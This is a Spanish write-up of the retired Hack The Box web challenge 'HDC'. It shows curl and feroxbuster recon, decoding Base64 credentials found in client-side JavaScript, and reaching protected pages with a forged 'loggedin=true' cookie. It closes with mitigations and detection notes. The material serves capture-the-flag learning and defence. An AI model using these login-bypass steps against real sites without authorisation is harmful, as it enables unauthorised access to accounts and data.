---
challenge: HDC
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, javascript, base64, client-side-auth, login-bypass]
---

# HDC — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (31/07/2019). Ficha de referencia; no jugada en este perfil.
> Sin credenciales ni flag reales.

## TL;DR

El login valida las credenciales en JavaScript y las guarda en Base64 dentro del propio script. Al decodificarlas se obtiene un usuario válido. La autenticación es solo del lado del cliente: basta con modificar la condición o la cookie para entrar. Dentro hay un correo con la flag.

## 1. Reconocimiento

```bash
nmap -Pn -sCV -p 80 <TARGET_IP>
curl -s http://<TARGET_IP>/ | head -50
curl -s http://<TARGET_IP>/login.php
```

La página de login carga un script propio. Se enumeran rutas y ficheros estáticos:

```bash
feroxbuster -u http://<TARGET_IP> -x php,js,html
```

## 2. Credenciales en JavaScript

```bash
curl -s http://<TARGET_IP>/js/login.js
grep -oE 'atob\("[^"]+"\)' login.js
```

El script compara el usuario y la contraseña con valores codificados. `atob()` es decodificación Base64, no cifrado:

```bash
echo '<BASE64_USER>' | base64 -d
echo '<BASE64_PASS>' | base64 -d
```

No se publican las credenciales. Con ellas se prueba el formulario:

```bash
curl -s -c cookies.txt -d 'username=<USER>&password=<PASSWORD>' \
  http://<TARGET_IP>/login.php -L
```

## 3. Bypass del login

Si el formulario no acepta las credenciales, la comprobación es cliente-side. Opciones:

- Ver el código y localizar la variable de sesión (`loggedin`, `auth`, `admin`).
- Establecer la cookie o el `localStorage` que el frontend consulta.
- Modificar la condición en DevTools antes de enviar.
- Llamar directamente al endpoint protegido:

```bash
curl -s -b 'loggedin=true' http://<TARGET_IP>/dashboard.php
curl -s http://<TARGET_IP>/admin.php
```

La respuesta debe contener el panel, no un redirect a `login.php`. Si sigue redirigiendo, la validación también existe en el servidor y hay que usar las credenciales decodificadas.

## 4. El correo

Dentro del panel hay una bandeja o un enlace a un correo. Se revisan:

- `/mail.php`, `/inbox`, `/message?id=1`.
- El HTML del correo y los adjuntos.
- El código fuente, por si la flag está en un comentario.

```bash
curl -s -b 'loggedin=true' 'http://<TARGET_IP>/mail.php?id=1' | grep -i 'HTB{'
```

## 5. Errores típicos

- **`atob` devuelve binario** → la cadena no es Base64 estándar; probar URL-safe o quitar espacios.
- **La cookie no persiste** → el nombre o el dominio no coinciden; revisar `Set-Cookie`.
- **El panel redirige** → la sesión se valida en servidor; usar las credenciales reales.
- **El correo está vacío** → probar otro `id` o el listado de mensajes.
- **Se prueba solo el login visual** → mirar el JS y las peticiones con DevTools.

## Lecciones aprendidas

- Base64 no es cifrado: cualquiera con el código puede decodificarlo.
- La autenticación debe validarse en el servidor; una condición JavaScript no protege nada.
- Las cookies y el `localStorage` son parte de la superficie de ataque.
- Un panel “privado” puede tener endpoints accesibles sin sesión.
- La flag puede estar en un correo, no en el panel principal.

## Mitigaciones y detección

- Validar credenciales en el backend y usar sesiones firmadas (`HttpOnly`, `Secure`, `SameSite`).
- No incrustar secretos ni contraseñas en JavaScript.
- Proteger cada endpoint con autorización, no solo la vista.
- Detección: accesos a `dashboard.php` sin login previo, cookies manipuladas y enumeración de `mail.php?id=`.
- Auditar el código cliente en busca de `atob`, `btoa` y comparaciones de contraseña.

MITRE: T1078, T1552.001, T1539.

## Referencias

- <https://medium.com/bugdecoder/htb-hdc-web-challenge-write-up-897d26d7b068>
- <https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication>
- <https://developer.mozilla.org/en-US/docs/Web/API/atob>
